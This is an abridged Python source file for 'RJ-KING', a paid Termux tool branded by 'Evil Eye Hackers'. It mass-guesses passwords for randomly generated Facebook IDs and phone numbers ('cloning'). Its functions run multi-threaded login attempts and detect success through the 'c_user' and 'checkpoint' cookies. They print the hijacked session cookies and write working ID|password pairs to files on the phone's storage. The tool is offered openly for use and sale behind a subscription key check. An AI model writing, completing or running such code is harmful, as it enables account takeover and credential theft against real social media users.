#created by RJRajuRazz
#team name Evil Eye Hackers
#tottaly written by RJRajuRazz
#!/usr/bin/python3 
#---------------------[IMPORT]---------------------#
...
class jalan:
    def __init__(self, z):
        for e in z + "\n":
            ...
            sys.stdout.flush()
            time.sleep(0.0001)
sys.stdout.write('\x1b[1;35m\x1b]2; Raju \x07')
###----------[ IMPORT LIBRARY ]---------- ###
import requests
import bs4
import sys
...
try:
    ...
    prox= requests.get('https://github.com/RJRajuRazz/RJ-KING/blob/main/RJ-KING.txt').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/RJRajuRazz/RJ-KING/blob/main/RJ-KING.txt').text
...
{warna}---------------------------------------------------{P}
 Author    {M}:\033[1;37m RJRajuRazz 
 Github    {M}:\033[1;37m RJRajuRazz
 Facebook  {M}:\033[1;37m RJRajuRazz
 Tool Name {M}:\033[1;37m RJ-KING
 Future    {M}:\033[1;37m {H}F{P}|{H}R{P}|{H}N{P}|{H}G{P}
 Status    {M}:\033[1;32m Premium{P}
 Version   {M}: {GREEN}3.0.5\033[1;37m
{warna}---------------------------------------------------{P}""")
led = f"""{warna}---------------------------------------------------"""
#---------------------[LOOP MENU]---------------------#
...
def Subscription():
    ...
    if key1 in r1:
        os.system('clear')
        banner2()
        print(f"{H}Hi Dear User😈 Your Subscription is Actived  {N}");time.sleep(2)
        menu()
    else:
        time.sleep(1.5)
        ...
        time.sleep(2)
        os.system("clear")
        banner2();print(f"\033[1;37m[\033[1;31m✓\033[1;37m] {RED}{BA}Hi Dear User😈  Your Key is Not Approved{N}");print (f"\033[1;37m[\033[1;31m✓\033[1;37m]\033[1;34m Key {P}= {warna}"+key1);print(led);print(f"\033[1;37m[\033[1;32m•\033[1;37m] Tools {M}: {H}Facebook cloning {N}");print(f"\033[1;37m[\033[1;32m•\033[1;37m] Note {M} :{K} {BA}Free user don't come inbox {N}");print(led);print(f'{H}{BA}The benefits you will get at our command{N}');print(led);print(f'{P}[{M}•{P}] File Create{N} ');print(f'{P}[{M}•{P}] File Cloning{N} ');print(f'{P}[{M}•{P}] Gmail Cloning{N} ');print(f'{P}[{M}•{P}] Number Cloning{N} ');print(f'{P}[{M}•{P}] RJRajuRazz New cloning {N} ');print(f'{P}[{M}•{P}] Random Uid Cloning{N} ');print(led);print(f'{N}{BA}If you want to buy this command then\n choose option number one{N}');print(led);print(f'{P}[{H}1{P}] {H}I want to buy RJRajuRazz Command{N} ');print(f'{P}[{B}2{P}] {B}Contract RJRajuRazz Admin{N} ');print(f'{P}[{K}3{P}] {K}Join RJRajuRazz Group{N} ');print(f'{P}[{RED}4{P}] {RED}Exit RJRajuRazz Terminal');print(led)
        opt = input(f'{P}[{M}+{P}] Choose {M}:{H} ')
        if opt =='1':
            tks = '*Jay Shree Ram*%2C%20*RJRajuRazz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING%20*---*%20*Version%20:%3.0.5%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
            os.system('xdg-open  https://wa.me/+919954282827?text='+tks)
            Subscription()
        if opt =='2':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828');Subscription()
        if opt =='3':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828');Subscription()
        if opt =='4':
            clear();banner2();jalan(f'{P}[{M}√{P}] Hi Bro Your RJ-KING Terminal Closed {P} ')
        else:
            print('\n\033[1;92mChoose valid option\033[0;97m');Subscription()
myid=uuid.uuid4().hex[:100].upper()
try:
    key2 = open('/data/data/com.termux/files/usr/bin/.RJ-KING', 'r').read()
except:
    kok=open('/data/data/com.termux/files/usr/bin/.RJ-KING', 'w')
    kok.write(myid)
    kok.close()
def Subscription():
    key2=open('/data/data/com.termux/files/usr/bin/.RJ-KING', 'r').read()
    ...
    if key2 in r1:
        os.system('clear')
        banner2()
        print(f"{H}Hi Dear User😈 Your Subscription is Activated  {N}");time.sleep(2)
        menu()
    else:
        time.sleep(1.5)
        print(f"{RED}Hi Dear User 👿Your Subscription is Expired{N}")
        ...
        opt = input(f'{P}[{M}+{P}] Choose {M}:{H} ')
        if opt =='1':
            tks = '*Jay Shree Ram*%2C%20*RJRajuRazz-SIR*%20*I*%20*WANT*%20*TO*%20*BUY*%20*YOUR*%20*NEW*%20*---*%20*RJ-KING Tool%20*3.0.5---*%20*Version%20:%3.0.%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20*My*%20*Key*%20*='+key1
            os.system('xdg-open  https://wa.me/+919954282827?text='+tks)
            Subscription()
        if opt =='2':
            os.system('xdg-open https://www.facebook.com/profile.php?id=100046446651828');Subscription()
...
if 'START' in ck:
    ...
    exit(f'{K}Updating RJ-KING');os.system("xdg-open https://github.com/RJRajuRazz/RJ-KING");os.system("xdg-open https://www.facebook.com/profile.php?id=100046446651828?mibextid=ZbWKwL")
elif 'BYS' in ck:
    banner2();jalan(f'{M}Fuck Bypass User 😂');time.sleep(2);Subscription1()
elif 'TRY' in ck:
    banner2();jalan(f'{O}Trail Off Buy Paid Command');time.sleep(2);Subscription()
banner2();jalan(f'{H}Update Checking Please Wait ') #;os.system("xdg-open https://github.com/RJRajuRazz/RJ-KING");os.system("xdg-open https://www.facebook.com/profile.php?id=100046446651828")
...
def dupcutter():
    os.system('clear');banner2();print(f' {P}Example   {M}:{H} /sdcard/RJ-KING.txt');print(led)
    Error = input(f" {N}File Name {M}:{H} ");print(led);print(f' {P}Example   {M}:{H} /sdcard/RJ.txt');print(led)
...
def gmail():
        ...
        clear();banner2();print(led);print(f'{P} Example :{H} Baishya,Das,Raju,RJ,Ankit,,,,,etc\033[0;97m');print(led)
        first = input(f'{P}Put First Name:{H} ')
        clear();banner2();print(led);print(f'{P} Example :{H} Baishya,Das,Saikia,Dutta,Sut,,,,,etc\033[0;97m');print(led);print(f'{P} Saved First Name : {H}'+first);print(led)
...
def s11():
    ...
    for nmbr in range(limit):
        ...
        for check1 in idf:
            ...
            RJRajuRazzxd.submit(filexxxx,idf,pwv)
    print(led);print(f'{N} Hi Dear User 😈 Your Crack process has been completed');print(f' {P}Total ok : {H}'+str(len(ok)));print(f' {P}Total cp : {K}'+str(len(cp)));print(led)
    input('Press Enter To Go Menu')
    menu()
...
def RJRajuRazzx():
    ...
    limit = int(input(f' {P}Input Limit {M}:{H}  '))
    if len(c_mange) < 3:
        print(f'\n{M} Hi Bro maybe u input wrong number');time.sleep(2);RJRajuRazzx()
    else:
        pass
    kode = c_mange[0:-7]
    for nmbr in range(limit):
...
def bd3():
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        idf.append(nmp)
    with ThreadPool(max_workers=40) as RJRajuRazzxd:
        os.system('clear')
        banner2()
        idx = str(len(idf))
        ...
        for check1 in idf:
            ...
            RJRajuRazz_xd.submit(filexxxx,idf,pwv)
...
def pk2():
    ...
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        idf.append(nmp)
    with ThreadPool(max_workers=70) as RJRajuRazzxd:
        os.system('clear')
        banner2()
        idx = str(len(idf))
        print(f' Crack User From : {H}{frm}{P}');print(f' Total Idz Crack : {H}{idx}{P}');print(f' Code Selected   : {H}{check}{P}');print('\x1b[1;92m Cloning Started Enjoy\033[1;97m');print(led)
...
def setting():
    ...
    if hc in ['1','01']:
        ...
        method.append('RJRajuRazz_crack')
        password()
    ...
    with tred(max_workers=60) as pool:
        for mahin_xd in id2:
            ...
            if 'RJRajuRazz_crack' in method:
                ...
                pool.submit(filexxxx,idf,pwv)
    print(led)
    print(f'{N} Hi Dear😈 User Your  Crack process has been completed')
    print(f' {P}Total ok : {H}'+str(len(ok)))
    print(f' {P}Total cp : {K}'+str(len(cp)))
    print(led)
    input('Press Enter To Go Menu')
...
def filexxxx(idf,pwv):
    ...
    try:
        for ps in pwv:
            ...
            sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJRajuRazz\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-2\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
            sys.stdout.flush()
    ...
    'viewport-width': '980',}
            ...
            if 'c_user' in log_cookies:
                ...
                uid = "1000"+coki1[0:11]
                ok.append(uid)
                print('\x1b[1;92m[RJRajuRazz-OK] '+uid+'|'+ps+'\33[0;97m '+Jawnx(uid)+' ');print('\x1b[1;92m[COOKIE-:] '+coki)
                ...
                coki1 = coki.split("1000")[1]
                uid = "1000"+coki1[0:11]
                print(f'{A}[RJRajuRazz-CP] '+uid+'|'+ps+' \33[0;97m'+Jawnx(uid)+' ')
...
def crackxxx(idf,pwv):
    ...
    sys.stdout.write(f'\r\x1b[1;97m[\033[1;92mRJRajuRazz-XD\033[1;97m] %s| \x1b[1;97m[\033[1;92mM-3\033[1;97m]{O} OK{P}-{H}%s \x1b[1;97m\r'%(loop,len(ok))),
    sys.stdout.flush()
...
"accept-language": "en-GB,en-US;q=0.9,en;q=0.8"})
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\x1b[1;93m[RJRajuRazz-CP]  '+idf+'|'+pw+'\033[0;97m     ')
                open('/sdcard/RJRajuRazz-CP.txt', 'a').write(idf+'|'+pw+'|'+ua+'\n')
                cp+=1
                break
                ...
                print(f'\x1b[1;92m[RJRajuRazz-OK] '+idf+'|'+pw+'\033[0;97m     ')
                print(f'\r    {P}[{H}√{P}] COOKIES   : {B}%s{P}'%(kuki))
                open('/sdcard/RJRajuRazz-OK.txt', 'a').write(idf+'|'+pw+'\n')
